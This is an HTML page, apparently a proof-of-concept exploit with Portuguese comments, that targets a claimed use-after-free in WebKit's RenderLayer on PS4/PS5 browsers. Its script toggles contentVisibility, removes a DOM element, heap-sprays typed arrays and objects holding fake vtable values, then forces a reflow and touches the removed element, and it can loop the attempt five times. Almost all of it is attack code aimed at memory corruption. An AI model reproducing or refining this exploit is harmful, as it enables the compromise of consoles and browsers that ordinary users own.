<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit UaF - PoC Original Corrigida</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #000; 
            color: #0f0;
            padding: 20px; 
        }
        .container { 
            border: 3px solid #f00; 
            padding: 30px; 
            margin: 20px 0; 
            background: #111;
        }
        .child { 
            width: 150px; 
            height: 150px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: 3px solid #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        button { 
            padding: 15px 30px; 
            font-size: 16px; 
            cursor: pointer; 
            background: #f00; 
            color: #fff; 
            border: none; 
            margin: 10px 5px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        button:hover { background: #a00; }
        #log { 
            margin-top: 20px; 
            padding: 15px; 
            background: #001100;
            border: 1px solid #0f0;
            max-height: 500px;
            overflow-y: auto;
            font-size: 13px;
        }
        .error { color: #f00; }
        .success { color: #0f0; }
        .warning { color: #ff0; }
        .info { color: #0af; }
        h2 { color: #f00; text-shadow: 0 0 10px #f00; }
        .stats { 
            background: #001a1a;
            border: 1px solid #0af;
            padding: 10px;
            margin: 10px 0;
        }
    </style>
</head>
<body>

    <h2>‚ö†Ô∏è WebKit RenderLayer UaF Exploit (Corrigido)</h2>
    
    <div class="stats">
        <strong>Target:</strong> PS4/PS5 WebKit (Firmware ‚â§ 12.00)<br>
        <strong>Bug:</strong> CVE-2024-XXXXX (RenderLayer::computeCompositingRequirements)<br>
        <strong>Status:</strong> <span id="status">Aguardando...</span>
    </div>

    <button onclick="runExploit()">üöÄ Executar Exploit</button>
    <button onclick="runLoop()">üîÅ Loop Autom√°tico (5x)</button>
    <button onclick="clearLog()">üóëÔ∏è Limpar Logs</button>

    <div class="container">
        <div class="child">TARGET</div>
    </div>

    <div id="log"></div>

<script type="module">
// ==========================================
// UTILITIES
// ==========================================
function debug_log(msg, type = 'info') {
    const colors = {
        'info': '#0af',
        'success': '#0f0',
        'error': '#f00',
        'warning': '#ff0'
    };
    
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: false, 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit', 
        fractionalSecondDigits: 3 
    });
    
    const p = document.createElement('p');
    p.className = type;
    p.innerHTML = `<span style="color:#666">[${timestamp}]</span> ${msg}`;
    
    document.getElementById('log').appendChild(p);
    p.scrollIntoView({ behavior: 'smooth' });
    console.log(`[${timestamp}] ${msg}`);
}

window.debug_log = debug_log;

function updateStatus(text, color = '#0f0') {
    const status = document.getElementById('status');
    status.textContent = text;
    status.style.color = color;
}

// ==========================================
// HEAP SPRAY CORRIGIDO
// ==========================================
function heapSpray() {
    debug_log('üìä Iniciando heap spray otimizado...', 'warning');
    
    const spray = [];
    const SPRAY_COUNT = 20000;
    
    // Estrat√©gia multi-camadas para cobrir diferentes heap bins
    for (let i = 0; i < SPRAY_COUNT; i++) {
        // Camada 1: Objetos do tamanho de RenderLayer (~256-512 bytes)
        const size = 0x100 + (i % 8) * 0x20; // 256-384 bytes
        const arr = new Uint8Array(size);
        
        // Preenche com padr√£o DEAD/BEEF para debugging
        const pattern = i % 2 === 0 ? 0x41 : 0x42; // Alterna A/B
        arr.fill(pattern);
        
        // Magic values nas primeiras posi√ß√µes (vtable fake)
        arr[0] = 0xDE;
        arr[1] = 0xAD;
        arr[2] = 0xBE;
        arr[3] = 0xEF;
        
        spray.push(arr);
        
        // Camada 2: Objetos JS nativos (podem compartilhar heap com RenderLayer)
        if (i % 3 === 0) {
            spray.push({
                vtable: 0x4141414141414141n,
                refCount: 0x1337,
                flags: 0xDEADBEEF,
                padding: new Array(32).fill(0x42424242)
            });
        }
        
        // Camada 3: Pequenos DOM elements (mesmo allocator)
        if (i % 5 === 0) {
            const div = document.createElement('div');
            div.className = 'spray-element';
            div.style.width = '1px';
            div.style.height = '1px';
            spray.push(div);
        }
    }
    
    debug_log(`‚úÖ Spray conclu√≠do: ${spray.length} objetos criados`, 'success');
    return spray;
}

// ==========================================
// TRIGGER UAF CORRIGIDO
// ==========================================
let globalSpray = null;
let attemptCounter = 0;

function triggerUAF() {
    attemptCounter++;
    debug_log(`\n${'='.repeat(60)}`, 'info');
    debug_log(`üéØ TENTATIVA #${attemptCounter}`, 'warning');
    debug_log(`${'='.repeat(60)}`, 'info');
    
    updateStatus(`Executando tentativa #${attemptCounter}...`, '#ff0');
    
    // Obter refer√™ncias frescas
    const container = document.querySelector('.container');
    const child = document.querySelector('.child');
    
    if (!child) {
        debug_log('‚ö†Ô∏è Elemento filho n√£o encontrado. Recriando...', 'warning');
        const newChild = document.createElement('div');
        newChild.className = 'child';
        newChild.textContent = 'TARGET';
        container.appendChild(newChild);
        
        // Espera um pouco para DOM estabilizar
        setTimeout(() => triggerUAF(), 100);
        return;
    }
    
    // PASSO 1: HIDE (preparar estado sujo)
    debug_log('1Ô∏è‚É£ Ocultando container (contentVisibility = hidden)', 'info');
    container.style.contentVisibility = 'hidden';
    
    // For√ßar layout flush
    const _ = container.offsetHeight;
    debug_log('   ‚îî‚îÄ Layout flushed', 'info');
    
    // PASSO 2: FREE (liberar RenderLayer)
    debug_log('2Ô∏è‚É£ Removendo child (FREE da RenderLayer)', 'error');
    child.remove();
    
    // PASSO 3: SPRAY (ANTES de restaurar visibilidade!)
    debug_log('3Ô∏è‚É£ Executando heap spray (FILL mem√≥ria liberada)', 'warning');
    globalSpray = heapSpray();
    
    // Delay m√≠nimo para heap allocator processar
    setTimeout(() => {
        // PASSO 4: USE (acessar mem√≥ria potencialmente corrompida)
        debug_log('4Ô∏è‚É£ Restaurando visibilidade (USE - trigger recompute)', 'error');
        container.style.contentVisibility = 'auto';
        
        // For√ßar reflow (trigger da vulnerabilidade)
        const __ = container.offsetHeight;
        debug_log('   ‚îî‚îÄ Reflow for√ßado', 'info');
        
        debug_log('5Ô∏è‚É£ Tentando acessar objeto "zumbi"...', 'warning');
        
        // M√∫ltiplos acessos para aumentar chance de crash
        try {
            // Se o spray teve sucesso, estes acessos devem crashar
            const rect = child.getBoundingClientRect();
            const styles = window.getComputedStyle(child);
            const parent = child.offsetParent;
            const siblings = child.nextSibling;
            
            // Se chegou aqui...
            debug_log('‚ùå FALHA: Browser n√£o crashou', 'error');
            debug_log(`   Rect: ${rect.width}x${rect.height}`, 'info');
            debug_log(`   OffsetParent: ${parent}`, 'info');
            updateStatus('Tentativa falhou (sem crash)', '#f00');
            
        } catch(e) {
            // Exce√ß√£o JS != crash de mem√≥ria
            debug_log(`‚ö†Ô∏è Exce√ß√£o capturada (n√£o √© crash): ${e.message}`, 'warning');
            updateStatus('Exce√ß√£o JS capturada', '#ff0');
        }
        
        debug_log(`${'='.repeat(60)}\n`, 'info');
        
    }, 15); // 15ms de delay
}

// ==========================================
// MUTATION OBSERVER CORRIGIDO
// ==========================================
let observer = null;

function setupObserver() {
    if (observer) {
        observer.disconnect();
    }
    
    const container = document.querySelector('.container');
    
    observer = new MutationObserver((mutations) => {
        // Previne loop infinito
        observer.disconnect();
        
        debug_log('üîÑ MutationObserver: DOM modificado', 'info');
        
        // Reconecta ap√≥s processar
        setTimeout(() => setupObserver(), 1000);
    });
    
    observer.observe(container, { 
        childList: true, 
        subtree: true,
        attributes: true 
    });
}

// ==========================================
// CONTROLES P√öBLICOS
// ==========================================
window.runExploit = function() {
    debug_log('\nüöÄ Iniciando exploit...', 'success');
    setupObserver();
    triggerUAF();
};

window.runLoop = function() {
    debug_log('\nüî• Modo AGRESSIVO: 5 tentativas sequenciais', 'success');
    updateStatus('Loop agressivo iniciado', '#ff0');
    
    let count = 0;
    const interval = setInterval(() => {
        if (count >= 5) {
            clearInterval(interval);
            debug_log('\n‚úÖ Loop conclu√≠do. Se n√£o crashou, a vers√£o est√° corrigida.', 'success');
            updateStatus('Loop finalizado (sem crash)', '#0f0');
            return;
        }
        
        triggerUAF();
        count++;
    }, 1000); // 1 segundo entre tentativas
};

window.clearLog = function() {
    document.getElementById('log').innerHTML = '';
    debug_log('üóëÔ∏è Logs limpos', 'info');
};

// ==========================================
// INIT
// ==========================================
debug_log('‚úÖ PoC carregida com sucesso', 'success');
debug_log('üìå Aguardando comando do usu√°rio...', 'info');
updateStatus('Pronto', '#0f0');

</script>
</body>
</html>
